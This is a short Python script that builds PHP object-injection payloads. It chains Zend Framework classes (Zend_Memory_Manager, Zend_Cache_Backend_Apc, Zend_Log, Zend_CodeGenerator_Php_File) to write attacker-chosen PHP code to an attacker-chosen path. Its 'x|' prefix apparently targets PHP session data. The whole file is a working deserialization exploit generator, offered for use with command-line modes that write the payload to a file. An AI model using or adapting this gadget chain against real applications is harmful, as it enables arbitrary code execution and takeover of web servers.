#!/usr/bin/env python3
"""Minimal PHP serializer used to build gadget payloads without side effects."""
import sys, hashlib

def S(x):
    if isinstance(x, str): x = x.encode()
    return b's:%d:"%s";' % (len(x), x)

def I(i): return b'i:%d;' % i
def B(b): return b'b:%d;' % (1 if b else 0)

def A(items):
    """items: list of (key, value_bytes); key int for numeric, str for string"""
    out = b'a:%d:{' % len(items)
    for k, v in items:
        out += (I(k) if isinstance(k, int) else S(k)) + v
    return out + b'}'

def O(cls, props):
    """props: list of (raw_name_bytes, value_bytes)"""
    if isinstance(cls, str): cls = cls.encode()
    out = b'O:%d:"%s":%d:{' % (len(cls), cls, len(props))
    for k, v in props:
        if isinstance(k, str): k = k.encode()
        out += S(k) + v
    return out + b'}'

def prot(name): return b'\x00*\x00' + name.encode()
def priv(cls, name): return b'\x00' + cls.encode() + b'\x00' + name.encode()

def codegen(path, code):
    return O('Zend_CodeGenerator_Php_File', [
        (prot('_filename'), S(path)),
        (prot('_sourceContent'), S(code)),
        (prot('_isSourceDirty'), B(False)),
    ])

def zend_log(writer, priorities=None):
    return O('Zend_Log', [
        (prot('_priorities'), A([(4, I(1))] if priorities is None else priorities)),
        (prot('_writers'), A([(0, writer)])),
        (prot('_filters'), A([])),
    ])

def apc_backend(logger):
    return O('Zend_Cache_Backend_Apc', [
        (prot('_directives'), A([('logging', B(True)), ('logger', logger)])),
    ])

def memory_manager(backend):
    return O('Zend_Memory_Manager', [
        (priv('Zend_Memory_Manager', '_backend'), backend),
        (priv('Zend_Memory_Manager', '_tags'), A([])),
    ])

if __name__ == '__main__':
    mode = sys.argv[1]
    if mode == 'testclass':
        obj = O('TestClass', [])
        print('x|' + obj.decode('latin-1'), end='')
    elif mode == 'pop':
        path, code = sys.argv[2], sys.argv[3]
        obj = memory_manager(apc_backend(zend_log(codegen(path, code))))
        data = b'x|' + obj
        open(sys.argv[4], 'wb').write(data)
        print('len', len(data), 'sha256', hashlib.sha256(data).hexdigest())
        print(repr(data[:200]))
    elif mode == 'popraw':
        path, code = sys.argv[2], sys.argv[3]
        obj = memory_manager(apc_backend(zend_log(codegen(path, code))))
        open(sys.argv[4], 'wb').write(obj)
        print('len', len(obj), 'sha256', hashlib.sha256(obj).hexdigest())
